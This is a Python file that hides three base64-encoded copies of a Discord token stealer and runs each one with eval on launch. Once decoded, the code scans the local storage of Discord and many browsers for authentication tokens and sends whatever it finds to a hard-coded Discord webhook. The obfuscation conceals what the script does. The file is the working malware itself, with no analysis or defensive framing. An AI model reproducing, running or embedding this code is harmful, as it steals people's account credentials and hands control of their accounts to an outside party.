import base64, codecs
import os

code1 = "aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgoKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKIyBXRUJIT09LIFVSTApXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDU0MTAyOTg5NzIxMzEzMzExL19vWE9GemVqYk9xc2I4UTUtTE1JcW1TdFM3aVJKTnd1b2k4OHBIOERobERYbm0tbjFySXY0bUhGcVhkbG04RzZwaHdFJwoKIyBNRU5USU9OUwpQSU5HX01FID0gRmFsc2UKCmRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKCiAgICB0b2tlbnMgPSBbXQoKICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mzh9JywgcidtZmFcLltcdy1dezg0fScpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgcmV0dXJuIHRva2VucwoKCmRlZiBtYWluKCk6CiAgICBsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKICAgIHJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQoKICAgIHBhdGhzID0gewogICAgICAgICdEaXNjb3JkJzogcm9hbWluZyArICdcXERpc2NvcmQnLAogICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5JywKICAgICAgICAnRGlzY29yZCBQVEInOiByb2FtaW5nICsgJ1xcZGlzY29yZHB0YicsCiAgICAgICAgJ0dvb2dsZSBDaHJvbWUnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywKICAgICAgICAnQnJhdmUnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ1lhbmRleCc6IGxvY2FsICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdvcGVyYWd4Jzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGUnLAogICAgICAgICdBbWlnbyc6IGxvY2FsICsgJ1xcQW1pZ29cXFVzZXIgRGF0YScsCiAgICAgICAgJ1RvcmNoJzogbG9jYWwgKyAnXFxUb3JjaFxcVXNlciBEYXRhJywKICAgICAgICAnS29tZXRhJzogbG9jYWwgKyAnXEtvbWV0YVxcVXNlciBEYXRhJywKICAgICAgICAnT3JiaXR1bSc6IGxvY2FsICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhJywKICAgICAgICAnQ2VudC1icm93c2VyJzogbG9jYWwgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAnN3N0YXInOiBsb2NhbCArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhJywKICAgICAgICAnU3B1dG5payc6IGxvY2FsICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhJywKICAgICAgICAnVml2YWxkaSc6IGxvY2FsICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhJywKICAgICAgICAnR29vZ2xlLWNocm9tZS1zeHMnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhJywKICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBsb2NhbCArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScKICAgIH0KCiAgICB0cnk6CiAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJwoKICAgICAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gcGF0aHMuaXRlbXMoKToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIAogICAgZXhjZXB0OgogICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgbWVzc2FnZSArPSBmJ1xuKipURU5UQVRJVkEgMSAtKipcbmBgYFxuJwoKICAgIHRva2VucyA9IGZpbmRfdG9rZW5zKHBhdGgpCgoKICAgIGlmIGxlbih0b2tlbnMpID4gMDoKICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICBtZXNzYWdlICs9IGYne3Rva2VufVxuJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG1lc3NhZ2UgKz0gJ1xuJwoKICAgICAgICBtZXNzYWdlICs9ICdgYGAnCgogICAgaGVhZGVycyA9IHsKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjExIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzIzLjAuMTI3MS42NCBTYWZhcmkvNTM3LjExJwogICAgfQoKICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgIHRyeToKICAgICAgICByZXEgPSBSZXF1ZXN0KFdFQkhPT0tfVVJMLCBkYXRhPXBheWxvYWQuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICB1cmxvcGVuKHJlcSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigpCgoK"
#24638

code2 = "aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgoKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKIyBXRUJIT09LIFVSTApXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDU0MTAyOTg5NzIxMzEzMzExL19vWE9GemVqYk9xc2I4UTUtTE1JcW1TdFM3aVJKTnd1b2k4OHBIOERobERYbm0tbjFySXY0bUhGcVhkbG04RzZwaHdFJwoKIyBNRU5USU9OUwpQSU5HX01FID0gRmFsc2UKCmRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKCiAgICB0b2tlbnMgPSBbXQoKICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mzd9JywgcidtZmFcLltcdy1dezg0fScpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgcmV0dXJuIHRva2VucwoKCmRlZiBtYWluKCk6CiAgICBsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKICAgIHJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQoKICAgIHBhdGhzID0gewogICAgICAgICdEaXNjb3JkJzogcm9hbWluZyArICdcXERpc2NvcmQnLAogICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5JywKICAgICAgICAnRGlzY29yZCBQVEInOiByb2FtaW5nICsgJ1xcZGlzY29yZHB0YicsCiAgICAgICAgJ0dvb2dsZSBDaHJvbWUnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywKICAgICAgICAnQnJhdmUnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ1lhbmRleCc6IGxvY2FsICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdvcGVyYWd4Jzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGUnLAogICAgICAgICdBbWlnbyc6IGxvY2FsICsgJ1xcQW1pZ29cXFVzZXIgRGF0YScsCiAgICAgICAgJ1RvcmNoJzogbG9jYWwgKyAnXFxUb3JjaFxcVXNlciBEYXRhJywKICAgICAgICAnS29tZXRhJzogbG9jYWwgKyAnXEtvbWV0YVxcVXNlciBEYXRhJywKICAgICAgICAnT3JiaXR1bSc6IGxvY2FsICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhJywKICAgICAgICAnQ2VudC1icm93c2VyJzogbG9jYWwgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAnN3N0YXInOiBsb2NhbCArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhJywKICAgICAgICAnU3B1dG5payc6IGxvY2FsICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhJywKICAgICAgICAnVml2YWxkaSc6IGxvY2FsICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhJywKICAgICAgICAnR29vZ2xlLWNocm9tZS1zeHMnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhJywKICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBsb2NhbCArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScKICAgIH0KCiAgICB0cnk6CiAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJwoKICAgICAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gcGF0aHMuaXRlbXMoKToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIAogICAgZXhjZXB0OgogICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgbWVzc2FnZSArPSBmJ1xuKipURU5UQVRJVkEgMiAtKipcbmBgYFxuJwoKICAgIHRva2VucyA9IGZpbmRfdG9rZW5zKHBhdGgpCgoKICAgIGlmIGxlbih0b2tlbnMpID4gMDoKICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICBtZXNzYWdlICs9IGYne3Rva2VufVxuJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG1lc3NhZ2UgKz0gJ1xuJwoKICAgICAgICBtZXNzYWdlICs9ICdgYGAnCgogICAgaGVhZGVycyA9IHsKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjExIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzIzLjAuMTI3MS42NCBTYWZhcmkvNTM3LjExJwogICAgfQoKICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgIHRyeToKICAgICAgICByZXEgPSBSZXF1ZXN0KFdFQkhPT0tfVVJMLCBkYXRhPXBheWxvYWQuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICB1cmxvcGVuKHJlcSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigpCgoK"
#24637

code3 = "aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgoKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKIyBXRUJIT09LIFVSTApXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDU0MTAyOTg5NzIxMzEzMzExL19vWE9GemVqYk9xc2I4UTUtTE1JcW1TdFM3aVJKTnd1b2k4OHBIOERobERYbm0tbjFySXY0bUhGcVhkbG04RzZwaHdFJwoKIyBNRU5USU9OUwpQSU5HX01FID0gRmFsc2UKCmRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKCiAgICB0b2tlbnMgPSBbXQoKICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9JywgcidtZmFcLltcdy1dezg0fScpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgcmV0dXJuIHRva2VucwoKCmRlZiBtYWluKCk6CiAgICBsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKICAgIHJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQoKICAgIHBhdGhzID0gewogICAgICAgICdEaXNjb3JkJzogcm9hbWluZyArICdcXERpc2NvcmQnLAogICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5JywKICAgICAgICAnRGlzY29yZCBQVEInOiByb2FtaW5nICsgJ1xcZGlzY29yZHB0YicsCiAgICAgICAgJ0dvb2dsZSBDaHJvbWUnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywKICAgICAgICAnQnJhdmUnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ1lhbmRleCc6IGxvY2FsICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdvcGVyYWd4Jzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGUnLAogICAgICAgICdBbWlnbyc6IGxvY2FsICsgJ1xcQW1pZ29cXFVzZXIgRGF0YScsCiAgICAgICAgJ1RvcmNoJzogbG9jYWwgKyAnXFxUb3JjaFxcVXNlciBEYXRhJywKICAgICAgICAnS29tZXRhJzogbG9jYWwgKyAnXEtvbWV0YVxcVXNlciBEYXRhJywKICAgICAgICAnT3JiaXR1bSc6IGxvY2FsICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhJywKICAgICAgICAnQ2VudC1icm93c2VyJzogbG9jYWwgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhJywKICAgICAgICAnN3N0YXInOiBsb2NhbCArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhJywKICAgICAgICAnU3B1dG5payc6IGxvY2FsICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhJywKICAgICAgICAnVml2YWxkaSc6IGxvY2FsICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhJywKICAgICAgICAnR29vZ2xlLWNocm9tZS1zeHMnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhJywKICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBsb2NhbCArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWx0JywKICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScKICAgIH0KCiAgICB0cnk6CiAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJwoKICAgICAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gcGF0aHMuaXRlbXMoKToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIAogICAgZXhjZXB0OgogICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgbWVzc2FnZSArPSBmJ1xuKipURU5UQVRJVkEgMyAtKipcbmBgYFxuJwoKICAgIHRva2VucyA9IGZpbmRfdG9rZW5zKHBhdGgpCgoKICAgIGlmIGxlbih0b2tlbnMpID4gMDoKICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICBtZXNzYWdlICs9IGYne3Rva2VufVxuJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG1lc3NhZ2UgKz0gJ1xuJwoKICAgICAgICBtZXNzYWdlICs9ICdgYGAnCgogICAgaGVhZGVycyA9IHsKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjExIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzIzLjAuMTI3MS42NCBTYWZhcmkvNTM3LjExJwogICAgfQoKICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgIHRyeToKICAgICAgICByZXEgPSBSZXF1ZXN0KFdFQkhPT0tfVVJMLCBkYXRhPXBheWxvYWQuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICB1cmxvcGVuKHJlcSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigpCgoK"
#24627

eval(compile(base64.b64decode(code1), "<string>", 'exec'))
eval(compile(base64.b64decode(code2), "<string>", 'exec'))
eval(compile(base64.b64decode(code3), "<string>", 'exec'))
